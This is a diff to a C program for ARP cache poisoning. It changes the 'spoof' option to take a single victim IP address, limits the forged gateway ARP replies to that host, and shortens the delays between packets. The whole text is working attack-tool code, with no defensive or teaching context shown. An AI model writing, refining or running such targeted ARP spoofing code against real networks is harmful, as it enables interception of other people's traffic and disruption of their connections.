@@ -45,6 +45,8 @@ static host * host_list[65536];
 
 static int is_end = 0;
 
+static unsigned int my = 0;
+
 void param_parse(int argc, char * argv[])
 {
 	static const char * usage = "sudo ./arp {some parameters}\n" 
@@ -70,10 +72,15 @@ void param_parse(int argc, char * argv[])
 		else if (!strcmp(argv[idx], "spoof"))
 		{
 			action = 1;
-			if (idx + 1 < argc)
+			/*if (idx + 1 < argc)
 			{
 				this.vmac = (unsigned char *)malloc(6);
 				memcpy(this.vmac, (unsigned char *)ether_aton(argv[idx + 1]), 6);
+			}*/
+			if (idx + 1 < argc)
+			{
+
+				my = inet_addr(argv[idx + 1]);
 			}
 		}
 		else
@@ -229,6 +236,7 @@ void * reply_handle(void * arg)
 		memcpy(&target->ip, ptr, 4);
 		memcpy(target->mac, ptr - 6, 6);
 		*tot += 1;
+		usleep(100);
 	}	
 	
 	close(sock);
@@ -318,10 +326,12 @@ void spoofing(int idx) //default is for all hosts
 			continue;
 		if (host_list[t]->ip == gateway.ip)
 			continue;
-	
+		if (host_list[t]->ip != my)
+			continue;
+
 		create_arp_packet(buf, ARPOP_REPLY, used, gateway.ip, host_list[t]->mac, host_list[t]->ip);
 		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
-		usleep(500);
+		usleep(100);
 	}
 	//normal packet
 	for (t = 1; t <= max; t++)
